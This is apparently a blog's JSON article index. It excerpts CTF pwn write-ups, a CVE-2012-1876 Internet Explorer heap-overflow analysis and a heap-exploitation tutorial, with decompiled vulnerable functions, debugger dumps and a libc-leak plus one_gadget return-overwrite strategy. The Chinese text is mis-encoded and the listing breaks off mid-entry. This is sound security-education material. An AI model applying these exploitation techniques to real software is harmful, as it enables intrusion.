{"total":13,"pageSize":10,"pageCount":2,"data":[{"title":"contribute_to_Apache","slug":"contribute-to-Apache","date":"2019-10-16T07:52:42.000Z","updated":"2019-10-16T13:33:29.186Z","comments":true,"path":"api/articles/contribute-to-Apache.json","excerpt":"<h2 id=\"å‰è¨€\"><a href=\"#å‰è¨€\" class=\"headerlink\" title=\"å‰è¨€\"></a>å‰è¨€</h2><p>ç”±äºå®éªŒå®¤é‡Œé¡¹ç›®éœ€æ±‚ç­‰åŸå› ï¼Œç¬”è€…çš„ç¡•å£«å¼€é¢˜æ–¹å‘å°†ä¼šåå‘å¤§æ•°æ®å¹³å°çš„å®‰å…¨ã€‚å‰äº›æ—¥å­åœ¨è°ƒç ”å†å²CVEå’Œissueè¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„è®¿é—®æ§åˆ¶é—®é¢˜ï¼Œä¸€å¼€å§‹å°è¯•è”ç³»Apacheå®‰å…¨å›¢é˜Ÿä½†æ³æ— éŸ³è®¯ï¼Œæœ€ç»ˆè€ƒè™‘åˆ°é—®é¢˜çš„ä¸¥é‡æ€§æ¯”è¾ƒä½ï¼Œäºæ˜¯å†³å®šæä¸€ä¸ªissueï¼Œæˆä¸ºcontributerğŸ‘‹ã€‚</p>\n<p>æ•´ä¸ªæµç¨‹è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ï¼Œè€Œä¸”ç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°æ¯”è¾ƒå¥½çš„ä¸­æ–‡èµ„æ–™ï¼Œåœ¨æ­¤æ•´ç†ä¸€ä¸‹è‡ªå·±çš„æ€è·¯ï¼Œå¦‚æœ‰é”™è¯¯ï¼Œæ¬¢è¿æ–§æ­£ã€‚</p>\n<p>p.s.: æœ¬æ–‡æ‰€è¿°çš„æ­¥éª¤ä¸»è¦åŸºäºApache Sentry çš„Wikiä¸­çš„è¯´æ˜ï¼Œå…¶ä»–é¡¹ç›®æˆ–è€…ä¼šæœ‰å°‘è®¸ä¸åŒã€‚</p>","keywords":null,"cover":"/image/image-20191016170814599.png","content":null,"text":"å‰è¨€ç”±äºå®éªŒå®¤é‡Œé¡¹ç›®éœ€æ±‚ç­‰åŸå› ï¼Œç¬”è€…çš„ç¡•å£«å¼€é¢˜æ–¹å‘å°†ä¼šåå‘å¤§æ•°æ®å¹³å°çš„å®‰å…¨ã€‚å‰äº›æ—¥å­åœ¨è°ƒç ”å†å²CVEå’Œissueè¿‡ç¨‹ä¸­å‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„è®¿é—®æ§åˆ¶é—®é¢˜ï¼Œä¸€å¼€å§‹å°è¯•è”ç³»Apacheå®‰å…¨å›¢é˜Ÿä½†æ³æ— éŸ³è®¯ï¼Œæœ€ç»ˆè€ƒè™‘åˆ°é—®é¢˜çš„ä¸¥é‡æ€§æ¯”è¾ƒä½ï¼Œäºæ˜¯å†³å®šæä¸€ä¸ªissueï¼Œæˆä¸ºcontributerğŸ‘‹","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"Dev","slug":"Dev","count":3,"path":"api/tags/Dev.json"},{"name":"Big Data","slug":"Big-Data","count":1,"path":"api/tags/Big-Data.json"}]},{"title":"æ•°å­—ç»æµäº‘å®‰å…¨CTF","slug":"æ•°å­—ç»æµäº‘å®‰å…¨CTF","date":"2019-09-24T13:27:08.000Z","updated":"2019-09-24T13:29:42.456Z","comments":true,"path":"api/articles/æ•°å­—ç»æµäº‘å®‰å…¨CTF.json","excerpt":"<p>â€‹    ä¸Šå‘¨æœ«è·Ÿç€dlä»¬æ··äº†ä¸€æ³¢æ‰€è°“â€œæ•°å­—ç»æµäº‘å®‰å…¨â€ä¼—æµ‹å¤§èµ›çš„æ¯”èµ›ï¼Œæœ€åé˜Ÿå†…çš„webå¸ˆå‚…å’Œmiscå¸ˆå‚…å‘æŒ¥ç¥å‹‡ï¼Œè€Œæˆ‘å’Œpwnçš„é˜Ÿå‹ä»¬åˆ™æ‹–äº†åè…¿ï¼Œæ‰€ä»¥åªè·å¾—50åï¼Œç€å®æœ‰äº›å¯æƒœã€‚è™½ç„¶ä¹Ÿç®—åšå‡ºäº†ä¸€é¢˜åŠï¼Œä½†è½å®ä¸‹æ¥ç”±äºå„ç§å› ç´ ä¸€é¢flagéƒ½æ²¡æœ‰å¾—åˆ°ï¼Œè¿™å€¼å¾—æˆ‘æ·±åˆ»åæ€ã€‚ä¸‹é¢ä¾æ¬¡çœ‹ä¸€ä¸‹ä¸¤é“pwnçš„é¢˜ç›®ã€‚</p>\n<h2 id=\"amazon\"><a href=\"#amazon\" class=\"headerlink\" title=\"amazon\"></a>amazon</h2><h3 id=\"å®¡è®¡\"><a href=\"#å®¡è®¡\" class=\"headerlink\" title=\"å®¡è®¡\"></a>å®¡è®¡</h3><h4 id=\"buy\"><a href=\"#buy\" class=\"headerlink\" title=\"buy\"></a>buy</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">buy</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> number; <span class=\"comment\">// [rsp+4h] [rbp-1Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> nbytes; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  __int64 count; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  put_names();</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"What item do you want to buy: \"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;number);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( number &lt;= <span class=\"number\">3</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"How many: \"</span>, &amp;number);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%lu\"</span>, &amp;count);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"How long is your note: \"</span>, &amp;count);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;nbytes);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes &lt;= <span class=\"number\">0x100</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> ( HIDWORD(nbytes) = <span class=\"number\">0</span>; SHIDWORD(nbytes) &lt;= <span class=\"number\">47</span> &amp;&amp; qword_4080[SHIDWORD(nbytes)]; ++HIDWORD(nbytes) )</span><br><span class=\"line\">        ;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( HIDWORD(nbytes) != <span class=\"number\">48</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        qword_4080[SHIDWORD(nbytes)] = (<span class=\"keyword\">char</span> *)<span class=\"built_in\">malloc</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)(nbytes + <span class=\"number\">40</span>));</span><br><span class=\"line\">        <span class=\"built_in\">strcpy</span>(qword_4080[SHIDWORD(nbytes)], (&amp;off_4020)[number]);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Content: \"</span>);</span><br><span class=\"line\">        read(<span class=\"number\">0</span>, qword_4080[SHIDWORD(nbytes)] + <span class=\"number\">32</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes);</span><br><span class=\"line\">        *(_QWORD *)&amp;qword_4080[SHIDWORD(nbytes)][(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)nbytes + <span class=\"number\">32</span>] = count;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done!\"</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v4;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"â€‹    ä¸Šå‘¨æœ«è·Ÿç€dlä»¬æ··äº†ä¸€æ³¢æ‰€è°“â€œæ•°å­—ç»æµäº‘å®‰å…¨â€ä¼—æµ‹å¤§èµ›çš„æ¯”èµ›ï¼Œæœ€åé˜Ÿå†…çš„webå¸ˆå‚…å’Œmiscå¸ˆå‚…å‘æŒ¥ç¥å‹‡ï¼Œè€Œæˆ‘å’Œpwnçš„é˜Ÿå‹ä»¬åˆ™æ‹–äº†åè…¿ï¼Œæ‰€ä»¥åªè·å¾—50åï¼Œç€å®æœ‰äº›å¯æƒœã€‚è™½ç„¶ä¹Ÿç®—åšå‡ºäº†ä¸€é¢˜åŠï¼Œä½†è½å®ä¸‹æ¥ç”±äºå„ç§å› ç´ ä¸€é¢flagéƒ½æ²¡æœ‰å¾—åˆ°ï¼Œè¿™å€¼å¾—æˆ‘æ·±åˆ»åæ€ã€‚ä¸‹é¢ä¾æ¬¡çœ‹ä¸€ä¸‹","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"2019æŠ¤ç½‘æ¯_mergeheap","slug":"2019æŠ¤ç½‘æ¯-mergeheap","date":"2019-09-10T12:24:26.000Z","updated":"2019-09-21T08:32:01.591Z","comments":true,"path":"api/articles/2019æŠ¤ç½‘æ¯-mergeheap.json","excerpt":"<h1 id=\"mergeheap\"><a href=\"#mergeheap\" class=\"headerlink\" title=\"mergeheap\"></a>mergeheap</h1><h2 id=\"å®¡è®¡ä¸åˆ†æ\"><a href=\"#å®¡è®¡ä¸åˆ†æ\" class=\"headerlink\" title=\"å®¡è®¡ä¸åˆ†æ\"></a>å®¡è®¡ä¸åˆ†æ</h2><h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[i]; ++i )</span><br><span class=\"line\">    ;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">14</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"full\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"len:\"</span>);</span><br><span class=\"line\">  v2 = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v2 &lt; <span class=\"number\">0</span> || v2 &gt; <span class=\"number\">1024</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  ptrs[i] = <span class=\"built_in\">malloc</span>(v2);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"content:\"</span>);</span><br><span class=\"line\">  read_until_nil(ptrs[i], v2);</span><br><span class=\"line\">  dword_202060[i] = v2;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æœ€å¤š14ä¸ªå †å—ï¼Œå¤§å°åœ¨0åˆ°0x400ä¹‹é—´ï¼Œå°†æ¯ä¸ªå †å—æŒ‡é’ˆå’Œå †å—sizeå­˜å‚¨åœ¨bssæ®µä¸Šçš„å…¨å±€æ•°ç»„å¤„ã€‚</p>\n<h3 id=\"show\"><a href=\"#show\" class=\"headerlink\" title=\"show\"></a>show</h3><p>ä¼šè¾“å‡ºå¯¹åº”å †å—æŒ‡é’ˆä¸­çš„å€¼ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">show</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"idx:\"</span>);</span><br><span class=\"line\">  v1 = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &gt;= <span class=\"number\">0</span> &amp;&amp; v1 &lt;= <span class=\"number\">14</span> &amp;&amp; ptrs[v1] )</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)ptrs[v1]);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"invalid\"</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":"mergeheapå®¡è®¡ä¸åˆ†æadd1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>int add()<br>&#123","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"CVE-2012-1876è°ƒè¯•åˆ†æ","slug":"CVE-2012-1876è°ƒè¯•åˆ†æ","date":"2019-07-10T12:19:25.000Z","updated":"2019-09-21T08:39:37.449Z","comments":true,"path":"api/articles/CVE-2012-1876è°ƒè¯•åˆ†æ.json","excerpt":"<h2 id=\"CVE-2012-1876\"><a href=\"#CVE-2012-1876\" class=\"headerlink\" title=\"CVE-2012-1876\"></a>CVE-2012-1876</h2><h3 id=\"1-æ¼æ´ç®€ä»‹\"><a href=\"#1-æ¼æ´ç®€ä»‹\" class=\"headerlink\" title=\"1. æ¼æ´ç®€ä»‹\"></a>1. æ¼æ´ç®€ä»‹</h3><p>ä¸€ä¸ªIEæ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨å¯RCEï¼Œé—®é¢˜åœ¨mshtml.dllæ¨¡å—çš„CTableLayout::CalculateMinMaxå‡½æ•°ä¸­ï¼Œç¨‹åºåœ¨æ‰§è¡Œæ—¶ä¼šä»¥HTMLä»£ç ä¸­\\å…ƒç´ çš„spanå±æ€§ä½œä¸ºå¾ªç¯æ§åˆ¶æ¬¡æ•°å‘å †ç©ºé—´å†™å…¥æ•°æ®ï¼Œå¦‚æœæ­¤spanå€¼è®¾ç½®çš„ä¸å½“ï¼Œé‚£ä¹ˆå°±ä¼šè§¦å‘å †æº¢å‡ºé—®é¢˜ã€‚</p>\n<p>å…¶ä¸­mshtml.dllæ¨¡å—æ˜¯IEä¸­çš„é‡è¦ç»„ä»¶ï¼Œç”¨æ¥è§£æHTMLå’ŒCSSã€‚ï¼ˆå¾®è½¯å®˜æ–¹è¯´æ˜<a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)ï¼‰\" target=\"_blank\" rel=\"noopener\">https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa741312(v=vs.85)ï¼‰</a></p>\n<p>ç³»ç»Ÿï¼šWin7 Pro x86</p>\n<p>ç‰ˆæœ¬ï¼šIE8.0.7601.17514</p>","keywords":null,"cover":"http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png","content":null,"text":"CVE-2012-18761. æ¼æ´ç®€ä»‹ä¸€ä¸ªIEæ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨å¯RCEï¼Œé—®é¢˜åœ¨mshtml.dllæ¨¡å—çš„CTableLayout::CalculateMinMaxå‡½æ•°ä¸­ï¼Œç¨‹åºåœ¨æ‰§è¡Œæ—¶ä¼šä»¥HTMLä»£ç ä¸­\\å…ƒç´ çš„spanå±æ€§ä½œä¸ºå¾ªç¯æ§åˆ¶æ¬¡æ•°å‘å †ç©ºé—´å†™å…¥æ•°æ®ï¼Œå¦‚æœæ­¤spanå€¼è®¾ç½®çš„ä¸å½“","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"2019CISCN_PWN(ä¸€)","slug":"2019CISCN-PWN-ä¸€","date":"2019-04-28T02:31:02.000Z","updated":"2019-09-21T08:32:43.789Z","comments":true,"path":"api/articles/2019CISCN-PWN-ä¸€.json","excerpt":"<h1 id=\"2019CISCN-PWNé¢˜è§£\"><a href=\"#2019CISCN-PWNé¢˜è§£\" class=\"headerlink\" title=\"2019CISCN_PWNé¢˜è§£\"></a>2019CISCN_PWNé¢˜è§£</h1><h2 id=\"0x00-Your-pwn\"><a href=\"#0x00-Your-pwn\" class=\"headerlink\" title=\"0x00  Your_pwn\"></a>0x00  Your_pwn</h2><h3 id=\"é˜²æŠ¤\"><a href=\"#é˜²æŠ¤\" class=\"headerlink\" title=\"é˜²æŠ¤\"></a>é˜²æŠ¤</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/2019_guosai/your_pwn/pwn&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n<p>RELROæ²¡å…¨å¼€ï¼Œå…¶ä½™å…¨å¼€</p>\n<h3 id=\"åˆ†æ\"><a href=\"#åˆ†æ\" class=\"headerlink\" title=\"åˆ†æ\"></a>åˆ†æ</h3><p>é¦–å…ˆä¼šå‘æ ˆä¸Šå†™0x100ï¼Œç„¶åå¾ªç¯è°ƒç”¨sub_B35å‡½æ•°ã€‚å‡½æ•°è¦æ±‚è¾“å…¥ä¸€ä¸ªindexï¼Œç„¶åleakå‡ºä»rbp - 0x150èµ·çš„v4[index]çš„å€¼ï¼Œç„¶åå°†å€¼è¦†ç›–ä¸ºè¦ä¿®æ”¹çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å®ç°æ ˆä¸Šçš„ä»»æ„è¯»å†™ã€‚</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_<span class=\"function\">BOOL8 <span class=\"title\">sub_B35</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> index; <span class=\"comment\">// [rsp+4h] [rbp-15Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+8h] [rbp-158h]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-154h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v4[<span class=\"number\">64</span>]; <span class=\"comment\">// [rsp+10h] [rbp-150h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [rsp+50h] [rbp-110h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v6; <span class=\"comment\">// [rsp+158h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v4, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">40</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input index\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"now value(hex) %x\\n\"</span>, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)v4[index]);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"input new value\"</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v2);</span><br><span class=\"line\">    v4[index] = v2;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"do you want continue(yes/no)? \"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">strncmp</span>(&amp;s, <span class=\"string\">\"yes\"</span>, <span class=\"number\">3u</span>LL) == <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"åˆ©ç”¨\"><a href=\"#åˆ©ç”¨\" class=\"headerlink\" title=\"åˆ©ç”¨\"></a>åˆ©ç”¨</h3><p>å…ˆleakå‡ºlibcåœ°å€</p>\n<p>libcåœ¨rsp+0x280å¤„ï¼Œä¸€å¼€å§‹è¾“å…¥çš„nameåœ¨rsp + 0x170å¤„ï¼Œ</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gefâ¤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffdc90â”‚+0x0140: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdc98â”‚+0x0148: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca0â”‚+0x0150: 0x0000000000000000</span><br><span class=\"line\">0x00007fffffffdca8â”‚+0x0158: 0x82e23df75b4cba00</span><br><span class=\"line\">0x00007fffffffdcb0â”‚+0x0160: 0x00007fffffffddd0  â†’  0x0000555555554ca0  â†’   push r15\t â† $rbp</span><br><span class=\"line\">0x00007fffffffdcb8â”‚+0x0168: 0x0000555555554b11  â†’   test eax, eax</span><br><span class=\"line\">0x00007fffffffdcc0â”‚+0x0170: 0x0000000a6377696c (&quot;liwc&quot;?)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gefâ¤  dereference $rsp</span><br><span class=\"line\">0x00007fffffffddd0â”‚+0x0280: 0x0000555555554ca0  â†’   push r15</span><br><span class=\"line\">0x00007fffffffddd8â”‚+0x0288: 0x00007ffff7a2d830  â†’  &lt;__libc_start_main+240&gt; mov edi, eax</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°ï¼Œåœ¨libcåœ°å€ä¸º0x7f766337c830æ—¶ï¼Œleakå‡ºçš„å€¼ä¸ºffffffc8ï¼Œæ‰€ä»¥åªéœ€è¦åˆ é™¤ffffffå³å¯ã€‚</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x00007fffbaeeb878â”‚+0x0288: 0x00007f765337c830  â†’  &lt;__libc_start_main+240&gt; mov edi, eax</span><br><span class=\"line\">[&apos;30&apos;, &apos;ffffffc8&apos;, &apos;37&apos;, &apos;53&apos;, &apos;76&apos;, &apos;7f&apos;, &apos;0&apos;, &apos;0&apos;]</span><br></pre></td></tr></table></figure>\n<p>æœ€åç›´æ¥æŠŠretnåœ°å€è¦†ç›–ä¸ºone_gadgetå³å¯ï¼Œç›´æ¥ç»•è¿‡äº†canaryï¼Œexpå¦‚ä¸‹<br>","keywords":null,"cover":null,"content":null,"text":"2019CISCN_PWNé¢˜è§£0x00  Your_pwné˜²æŠ¤1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn<br>[*] &apos;/home/li","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":9,"path":"api/tags/pwn.json"}]},{"title":"Top Chunkåˆ©ç”¨","slug":"Top Chunkåˆ©ç”¨","date":"2019-04-21T02:58:07.000Z","updated":"2019-09-21T08:33:55.366Z","comments":true,"path":"api/articles/Top Chunkåˆ©ç”¨.json","excerpt":"<p>æœ¬æ–‡è®²ä¸€ä¸‹è¿‘æœŸå­¦ä¹ çš„ä¸¤ç§å›´ç»•Top Chunkåšæ–‡ç« çš„å †åˆ©ç”¨æ–¹æ³•ï¼šHouse of Forceå’Œç›´æ¥ä¿®æ”¹main_arenaä¸­çš„topæŒ‡é’ˆã€‚</p>\n<h2 id=\"House-of-forceï¼ˆTop-chunkåŠ«æŒï¼‰\"><a href=\"#House-of-forceï¼ˆTop-chunkåŠ«æŒï¼‰\" class=\"headerlink\" title=\"House of forceï¼ˆTop chunkåŠ«æŒï¼‰\"></a>House of forceï¼ˆTop chunkåŠ«æŒï¼‰</h2><h3 